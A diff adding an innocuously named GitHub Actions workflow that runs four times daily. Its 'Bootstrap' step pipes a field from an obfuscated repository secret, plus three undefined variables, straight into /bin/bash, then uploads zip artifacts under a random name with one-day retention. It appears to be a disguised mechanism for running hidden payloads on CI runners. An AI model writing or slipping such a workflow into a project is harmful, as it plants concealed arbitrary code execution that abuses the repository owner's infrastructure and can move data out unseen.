@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          n0764: ${{ secrets.n0764 }}
+        run: |
+          printf '%s' "$n0764" | jq -r .bl87812 | /bin/bash
+          printf '%s' "$fepw2293" | jq -r .hvz939 | /bin/bash
+          echo $xff839 | jq -r .eh76453 | /bin/bash
+          echo $a67 | jq -r .i361 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: t1lDkEMx
+          path: "*.zip"
+          retention-days: 1
